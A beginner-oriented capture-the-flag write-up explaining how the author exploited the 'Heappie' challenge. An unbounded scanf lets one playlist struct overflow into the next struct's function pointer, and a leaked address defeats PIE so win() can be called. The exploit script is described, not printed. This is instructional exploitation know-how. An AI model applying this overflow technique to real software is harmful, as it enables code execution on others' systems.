*This writeup aims at being more on the “tutorial” side, so it’ll contain a lot more details than “traditionnal” writeups. This was also my first heap exploitation ever, and on 64 bits too ! I found this chall to be a really great introduction to heap exploitation, so thanks xanhacks for that !*

# Walkthrough  
## Checking binary type & protections
* i prefer to first check the protections in place and the type of binary we’re dealing with, before diving into the source code: this will help me paint a picture of what i can do when i analyse the source code  

	```bash
	➜  checksec heappie
	[*] '/home/kali/secu_classes_ctf/ctf_events/hero_ctf_2024/pwn/Heappie/heappie'
	    Arch:       amd64-64-little
	    RELRO:      Partial RELRO
	    Stack:      No canary found
	    NX:         NX enabled
	    PIE:        PIE enabled
	    Stripped:   No
	    Debuginfo:  Yes
	
	➜  file heappie
	heappie: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d8609e05595130735a889757138dd5768389f6b1, for GNU/Linux 3.2.0, with debug_info, not stripped
	```  

> This tells us:
> NX ⇒ we cant execute directly on the stack.
> PIE ⇒ the program base addresss (the address where it is loaded in memory) is randomized each time we run it.
> The binary is a 64 bits, and isn’t stripped, which means the symbols names havent been removed.

## Analysing the source code
* we find a `win` function, which is the name generally given to functions we need to call to catch the challenges flags:
    
    ```c
    void win() {
        char flag[64];
        FILE* f = fopen("flag.txt", "r");
        if (f == NULL) {
            puts("Flag file is missing!");
            exit(1);
        }
    
        fgets(flag, sizeof(flag), f);
        printf("Flag: %s", flag);
        fclose(f);
    }
    ```

- the line `scanf("%s", music->description);` shows that `scanf` is used to write the user input into the element `description` of a struct called `music` (`music->description`) and that no proper boundary check is done. This means we can write in there a string as long as we want … and possibly overflow some memory that we could use.
  
  ```bash
    void add_music() {
    
        if (playlist_size == playlist_capacity) {
            playlist_capacity += 10;
            playlist = realloc(playlist, playlist_capacity * sizeof(Music));
        }
    
        Music* music = &playlist[playlist_size];
        char add_music = 'n';
        printf("Do you want to add a sound to the music? (y/n): ");
        scanf(" %c", &add_music);
        if (add_music == 'y') {
            music->play = choose_random_play();
            puts("Sound added to the music!");
        } else {
            puts("No sound added to the music!");
        }
        printf("Enter music title: ");
        scanf("%31s", music->title);
        printf("Enter music artist: ");
        scanf("%31s", music->artist);
    
        **printf("Enter music description: ");
        scanf("%s", music->description);**
    
        puts("Music added to your playlist!\n");
        playlist_size++;
    }
    ```
    
- Lets analyse the composition of the `Music` struct:
    
    ```c
    typedef struct Music {
        void (*play)(struct Music*);
        char title[32];
        char artist[32];
        char description[128]; // we'll feed this
    } Music;
    ```
    
- Let’s say we create one struct name `music_1`. Looking at the struct composition, we see that once we overflow the `description` element using 128 chars, we will land “out of it”. Now let’s create a second struct, called `music_2`...
- Question: where will the overflown data from `music_1` be located ? Straight into the first element of `music_2`: the `play` pointer.
- This means that whatever will be written into `play`, will be identified as a memory address that will, at one point, be executed by the program.
- Now i’m thinking about writing the address of the `win` function there. Let’s find a way to call it.

> When we create a second struct, it’ll be located in memory, on the heap (malloc and realloc are used to do so, and the space they allocate is on the heap), right after the first one. Hence, overflowing a first struct brings us straight into the second one.

- for curiosity sake ⇒ `play` will be used in `play_music`:   

    ```c
    void play_music() {
        int index;
    
        printf("Enter music index: ");
        scanf("%d", &index);
    
        if (index < 0 || index >= playlist_size) {
            puts("Invalid index!\n");
            return;
        }
    
        Music* music = &playlist[index];
        if (music->play == NULL) {
            puts("No sound for this music!\n");
            return;
        }
    
        music->play(music);
    }
    ```
    
## Plan Idea
- We are thinking of:
    - filling a first `Music` struct `description` element with 128 characters (to cover the whole 128 bytes space dedicated) which will get us at the end of the said struct.
    - Adding another 8 bytes to get them into the second struct first element: `play` . Those 8 bytes will contain the address of the `win` function
    - running the proper music index, and get our flag.
- Now, lets play a bit with the program to better understand its behaviour …

## Interacting with the program
- `heappie` greets us with this menu:

    ![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/ce2f2511-f4ee-4eb0-b75b-3d423044fdc5/image.png)

- When we add a music, two options are offered: `Do you want to add a sounds to the music? (y/n):` let’s chose `n` first:  

    ![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/0bf588f1-011f-469b-b81f-7476c231545d/image.png)
    
- then we’re asked to add a title, an artist, and a description  

    ![when done, the original menu shows up again](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/7f6cd265-c43b-439a-9c7c-cad410bf751f/image.png)
    
    when done, the original menu shows up again
    
- lets use option `4. Show playlist`  

    ![`(nil)` appears, which means that at one point, `NULL` has been returned](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/0637a749-17f8-4cb7-9682-9c540f214483/image.png)
    
    `(nil)` appears, which means that at one point, `NULL` has been returned

- lets check whats being used to output this:
    
    ```c
    void show_playlist() {
        if (playlist_size == 0) {
            puts("Your playlist is empty!\n");
            return;
        }
    
        puts("Your playlist:");
        for (int i = 0; i < playlist_size; i++) {
            Music* music = &playlist[i];
            printf("\t%d. %s by %s (song: %p)\n", i + 1, music->title, music->artist, music->play);
        }
    } 
    ```
    
- ok, lets repeat the whole process by adding another music, but this time, let’s add a sound to see what happens:
    
    ![`0x556949c7d2e9` is the address of `music->play` (remember the `printf` in `show_playlist()`)](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/8b9975f3-f8ad-4090-8ab1-faede1795943/image.png)
    
    `0x556949c7d2e9` is the address of `music->play` (remember the `printf` in `show_playlist()`)
    
- ok done, now lets play the first music:
    
    ![no sound added, no music …](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/decc1af5-68df-482e-8dfe-5de8485f68bd/image.png)
    
    no sound added, no music …
    
- lets play the second music we’ve added:
    
    ![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/eae653c6-875e-40be-95c0-0882484d0e51/image.png)
    
- now lets try filling into `description` 128 chars A + 4 chars B, create a second struct, and see if the address displayed contains our B’s. Lets do that without a script:
    
    ![good ! our B’s landed on the second music struct `play` pointer. Also, the segfault when running `0x42424242` confirms that what is overflown into `play` is being run. So if we can get the win() address and drop it there, we should be good ;)](https://prod-files-secure.s3.us-west-2.amazonaws.com/687c61fc-3948-4f25-9660-605b7f6c4093/e35f4fe5-7999-4cab-8cb9-aa3937743cba/image.png)
    
    good ! our B’s landed on the second music struct `play` pointer. Also, the segfault when running `0x42424242` confirms that what is overflown into `play` is being run. So if we can get the win() address and drop it there, we should be good ;)
    

> Alright, done … now what did we see ? 
We have the confirmation that we can overwrite the content a struct from a previous one.
Our goal is to drop the `win` address in `play` and get it called/run to display the flag.
When we add a sound, the address of the `play` pointer is printed, and the printed address is also whats being run.
Good, now lets find out how to get the `win` address.

## Leaking addresses

- we know the binary isn’t stripped, which means we can easily retrieve the `win` function:
    
    ```python
    ➜ objdump -D -M intel ./heappie | grep win
    00000000000011f9 <win>:
        1223:       75 19                   jne    123e <win+0x45>
    ➜ readelf -s ./heappie | grep win
        41: 00000000000011f9   132 FUNC    GLOBAL DEFAULT   15 win
    ```
    
- we have the offset of win, but what we want is its address. Also we know that the base address of the program is randomized each time the program is run …

> We need to be able to get the win address at runtime. What this means is: we need a script that will run `heappie` and, while it runs, will collec the `win` address, choose the `2. Play music` option, `win` is called and we have our flag


## Final plan:

- we need a script that will:
    - create a first music struct that we will use to leak an address through the `y` option
    - create a second struct that we will use to overflow the memory
    - create a third struct that will inherit from the `win` runtime address brought into its `play` element
    - run the third music to “trigger” the `win` function and read the flag
    - all this needs to happen when the program is running

## How to get the program base address at runtime to find the win() address:

- What we have collected:
    - an offset of `win` , lets call it `win_offset`
    - `play_1` address.
- But we want the address of `win`. The idea is this:
    - in order to get the `win` address, we need the PROGRAM base address first …
    - once we have it, we add the offset of `win` and poof, we have the `win` address
- How do we get the `win` address ?
    - find the offset of `play_1` using pwntools
    - substract the ADDRESS of `play_1` with the OFFSET of `play_1` to get the base address:
        - `program_base_address = play_1_address - play_1_offset`
    - And calculate the win address:
        - `win_address = program_base_address + win_offset`
        

## Testing locally before testing remotely:

- I was sending commands one by one, to see how the program reacts. My goal was to first make sure everything works, get the flag, and later on clean the script.
- once the first struct was built and the address leaked, the goal was to collect the data output, and parse it using Regex to find the leaked address:

> Now that we flag locally, lets try remotely  

## Trying remotely and flag !
- Had to modify line 8 and add lines 24 and 25 in order to receive more data or the program would crash (for obscure reasons to me, would love to better understand that so if anyone reading is willing to explain this to me, i take it ^^)
- For sure was i happy when seeing the flag:

# Summary
`Heappie` is using the heap to store its playlists, those playlists are `structs` called `music` and those structs are stored in a "chain" format: one after the other. The last element (`description`), didn't limit the input of the user, which allowed us to overflow the first element of the following `music` struct aka `*play`, which was run when chosing `Play music` from the playlist. We wrote in it the address of the `win()` function, played the music, and got our flag.

# Further reflections
1. one thing i understood later, after a friend explained it to me, was the answer to:
    - why does `[*] Switching to interactive mode` appears after the address are being printed and BEFORE the output of the commands we sent ?”
    - The reason is:
        - when switching to interactive mode, our commands have actually ALREADY been sent, so the script first prints what we asked it to print, then, it switches to interactive mode and shows us what would happen (or closely to) if we enter the commands manually

2. sometimes the program was crashing and sometimes not ⇒ the reason is because `ASLR` is enabled on the remote machine. `ASLR` is also random itself, meaning that sometimes the address that will be loaded is invalid/in-use and therefore, the program crashes when trying to run something there.

# Retex  
I did a bit of binary exploitation before (only abusing stacks and 32 bits) so this was my first ever heap exploitation. I was REALLY pleased about how much of a good introduction this was to me.  
It probably took me 6-8 hours, with the last moment being me screaming with excitment when seeing the flag ^^
